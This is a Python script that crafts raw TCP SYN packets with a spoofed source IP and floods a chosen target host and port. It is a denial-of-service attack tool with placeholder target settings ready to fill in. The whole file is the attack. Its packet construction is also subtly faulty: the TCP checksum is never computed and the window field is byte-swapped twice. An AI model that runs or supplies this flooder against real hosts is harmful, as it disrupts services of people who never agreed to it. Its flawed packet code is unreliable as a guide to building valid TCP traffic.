import socket
import random
import struct
import time

def create_ip_header(source_ip, dest_ip):
    # IP header fields
    version_ihl = 0x45
    tos = 0
    total_length = 0  # Kernel will fill the correct length
    id = random.randint(0, 65535)
    frag_off = 0
    ttl = 64
    protocol = socket.IPPROTO_TCP
    check = 0  # Kernel will fill the correct checksum
    source_ip = socket.inet_aton(source_ip)
    dest_ip = socket.inet_aton(dest_ip)

    # Pack IP header
    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, id, frag_off, ttl, protocol, check, source_ip, dest_ip)
    return ip_header

def create_tcp_header(source_port, dest_port, sequence_number, ack_number, data_offset, flags, window, checksum, urgent_pointer):
    # Pack TCP header
    tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, sequence_number, ack_number, data_offset, flags, window, checksum, urgent_pointer)
    return tcp_header

def send_syn_flood(target_ip, target_port, packet_count):
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error as e:
        print(f"Socket creation error: {e}")
        return
    
    # Spoofed source IP (you might want to change this for testing purposes)
    source_ip = '192.168.1.100'
    # Randomize source port
    source_port = random.randint(1024, 65535)
    # Initial TCP sequence number
    sequence_number = random.randint(0, 65535)
    # No acknowledgment number for SYN
    ack_number = 0
    # Data offset for TCP header
    data_offset = 0x50
    # SYN flag
    flags = 0x02
    # Window size
    window = socket.htons(5840)
    # Checksum and urgent pointer
    checksum = 0
    urgent_pointer = 0
    
    # Create IP and TCP headers
    ip_header = create_ip_header(source_ip, target_ip)
    tcp_header = create_tcp_header(source_port, target_port, sequence_number, ack_number, data_offset, flags, window, checksum, urgent_pointer)
    
    # Full packet
    packet = ip_header + tcp_header

    # Flood the target with SYN packets
    for _ in range(packet_count):
        try:
            sock.sendto(packet, (target_ip, target_port))
            print(f"Sent SYN packet {_ + 1} to {target_ip}:{target_port}")
        except socket.error as e:
            print(f"Packet send error: {e}")
        time.sleep(0.1)

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Replace with the target IP address
    target_port = 80          # Replace with the target port
    packet_count = 1000       # Number of packets to send

    send_syn_flood(target_ip, target_port, packet_count)
